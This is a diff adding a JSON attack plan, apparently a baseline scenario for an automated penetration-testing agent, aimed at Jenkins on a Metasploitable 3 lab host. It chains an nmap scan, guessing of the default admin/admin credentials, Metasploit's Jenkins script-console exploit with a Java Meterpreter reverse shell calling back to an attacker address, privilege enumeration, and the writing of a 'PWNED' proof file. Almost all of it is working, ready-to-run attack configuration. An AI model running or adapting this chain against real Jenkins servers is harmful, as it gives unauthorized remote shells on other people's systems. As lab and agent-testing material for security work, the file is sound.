@@ -1,0 +1,314 @@
+{
+  "id": "502b8b26",
+  "name": "jenkins_rce_192.168.34.7",
+  "description": "Jenkins script-console RCE happy-path baseline against MS3.",
+  "objective": "Compromise the Metasploitable 3 target via Jenkins on port 8484. Jenkins ships with admin/admin in the MS3 lab build; use the script console to land a Java Meterpreter session, then verify access and drop a proof file.",
+  "target_ip": "192.168.34.7",
+  "attacker_ip": "192.168.34.6",
+  "scope": [
+    "192.168.34.7"
+  ],
+  "nodes": {
+    "recon": {
+      "id": "recon",
+      "label": "Nmap Full Scan",
+      "tactic": "reconnaissance",
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery",
+      "agent_type": "recon",
+      "goal": "Map the target's attack surface and confirm Jenkins on 8484",
+      "objective": "Full port scan with service versioning on 192.168.34.7.",
+      "target_ip": "192.168.34.7",
+      "tool_name": "nmap",
+      "module": "",
+      "module_options": {},
+      "module_options_alternatives": {},
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [
+        "nmap -sV -p 0-65535 192.168.34.7"
+      ],
+      "command_params": {},
+      "command_params_alternatives": {},
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-05-27T10:01:59.713884+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "nmap",
+        "full_scan"
+      ]
+    },
+    "jenkins_login": {
+      "id": "jenkins_login",
+      "label": "Verify Jenkins admin/admin",
+      "tactic": "credential_access",
+      "technique_id": "T1110.001",
+      "technique_name": "Brute Force: Password Guessing",
+      "agent_type": "exploit",
+      "goal": "Confirm valid Jenkins credentials before attempting RCE",
+      "objective": "Try admin/admin against Jenkins login form on 192.168.34.7:8484.",
+      "target_ip": "192.168.34.7",
+      "tool_name": "metasploit",
+      "module": "auxiliary/scanner/http/jenkins_login",
+      "module_options": {
+        "RHOSTS": "192.168.34.7",
+        "RPORT": 8484,
+        "USERNAME": "admin",
+        "PASSWORD": "admin",
+        "STOP_ON_SUCCESS": true
+      },
+      "module_options_alternatives": {
+        "PASSWORD": [
+          "jenkins",
+          "password",
+          "vagrant"
+        ]
+      },
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [],
+      "command_params": {},
+      "command_params_alternatives": {},
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 2,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-05-27T10:01:59.713884+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "jenkins",
+        "login",
+        "credentials"
+      ]
+    },
+    "jenkins_rce": {
+      "id": "jenkins_rce",
+      "label": "Jenkins Script Console RCE",
+      "tactic": "initial_access",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "agent_type": "exploit",
+      "goal": "Obtain a session by exploiting the Jenkins script console",
+      "objective": "Run exploit/multi/http/jenkins_script_console against 192.168.34.7:8484 with admin/admin; payload java/meterpreter/reverse_tcp.",
+      "target_ip": "192.168.34.7",
+      "tool_name": "metasploit",
+      "module": "exploit/multi/http/jenkins_script_console",
+      "module_options": {
+        "RHOSTS": "192.168.34.7",
+        "RPORT": 8484,
+        "TARGETURI": "/",
+        "USERNAME": "admin",
+        "PASSWORD": "admin"
+      },
+      "module_options_alternatives": {},
+      "payload": "java/meterpreter/reverse_tcp",
+      "payload_options": {
+        "LHOST": "192.168.34.6",
+        "LPORT": 4444
+      },
+      "commands_to_run": [],
+      "command_params": {},
+      "command_params_alternatives": {},
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-05-27T10:01:59.713884+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "jenkins",
+        "script_console",
+        "rce",
+        "meterpreter"
+      ]
+    },
+    "privesc_verify": {
+      "id": "privesc_verify",
+      "label": "Verify Session Privileges",
+      "tactic": "discovery",
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "agent_type": "impact",
+      "goal": "Identify session privilege level for subsequent steps",
+      "objective": "Run id, whoami, and sudo -l against the new session.",
+      "target_ip": "192.168.34.7",
+      "tool_name": "session",
+      "module": "",
+      "module_options": {},
+      "module_options_alternatives": {},
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [
+        "id",
+        "whoami",
+        "sudo -n -l"
+      ],
+      "command_params": {},
+      "command_params_alternatives": {},
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 1,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-05-27T10:01:59.713884+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {},
+      "tags": [
+        "privesc",
+        "sudo",
+        "verify"
+      ]
+    },
+    "file_drop": {
+      "id": "file_drop",
+      "label": "Drop Proof-of-Compromise File",
+      "tactic": "impact",
+      "technique_id": "T1485",
+      "technique_name": "Data Destruction",
+      "agent_type": "impact",
+      "goal": "Demonstrate Jenkins compromise with a written artifact",
+      "objective": "Write a proof-of-compromise file via the session.",
+      "target_ip": "192.168.34.7",
+      "tool_name": "session",
+      "module": "",
+      "module_options": {},
+      "module_options_alternatives": {},
+      "payload": "",
+      "payload_options": {},
+      "commands_to_run": [
+        "echo '{marker}' > {target_file}",
+        "echo \"Compromised at $(date)\" >> {target_file}",
+        "echo \"User: $(whoami)\" >> {target_file}",
+        "cat {target_file}"
+      ],
+      "command_params": {
+        "target_file": "/tmp/pwned_jenkins.txt",
+        "marker": "PWNED via Jenkins script console"
+      },
+      "command_params_alternatives": {
+        "target_file": [
+          "/var/tmp/pwned_jenkins.txt",
+          "/dev/shm/pwned_jenkins.txt"
+        ]
+      },
+      "status": "pending",
+      "retries": 0,
+      "max_retries": 3,
+      "commands": [],
+      "findings": {},
+      "summary": "",
+      "created_at": "2026-05-27T10:01:59.713884+00:00",
+      "started_at": "",
+      "completed_at": "",
+      "metadata": {
+        "target_file": "/tmp/pwned_jenkins.txt"
+      },
+      "tags": [
+        "impact",
+        "file_drop",
+        "proof"
+      ]
+    }
+  },
+  "edges": [
+    {
+      "source": "recon",
+      "target": "jenkins_login",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "ports",
+          "operator": "any_port",
+          "expected": {
+            "port": 8484
+          },
+          "description": "Jenkins service is open on 8484"
+        }
+      ],
+      "evidence": "Nmap found Jenkins on port 8484",
+      "rationale": "Verify admin/admin before attempting authenticated RCE",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "jenkins_login",
+      "target": "jenkins_rce",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "success",
+          "operator": "equals",
+          "expected": "True",
+          "description": "Valid Jenkins credentials confirmed"
+        }
+      ],
+      "evidence": "Jenkins admin login succeeded",
+      "rationale": "Use confirmed creds to fire the script console RCE",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "jenkins_rce",
+      "target": "privesc_verify",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "session_id",
+          "operator": "exists",
+          "expected": null,
+          "description": "Java meterpreter session opened"
+        }
+      ],
+      "evidence": "Got Java meterpreter session via Jenkins",
+      "rationale": "Inspect the session's privileges before deciding next step",
+      "label": "",
+      "metadata": {}
+    },
+    {
+      "source": "privesc_verify",
+      "target": "file_drop",
+      "condition": "on_success",
+      "checks": [
+        {
+          "field": "success",
+          "operator": "equals",
+          "expected": "True",
+          "description": "Session is usable"
+        }
+      ],
+      "evidence": "Session privileges enumerated",
+      "rationale": "Drop the proof-of-compromise file as the impact step",
+      "label": "",
+      "metadata": {}
+    }
+  ],
+  "known_credentials": [],
+  "active_sessions": [],
+  "discovered_hosts": [],
+  "status": "planned",
+  "created_at": "2026-05-27T10:01:59.713884+00:00",
+  "started_at": "",
+  "completed_at": "",
+  "metadata": {
+    "scenario": "jenkins_script_console_rce",
+    "target_type": "metasploitable3"
+  },
+  "version": "1.0"
+}
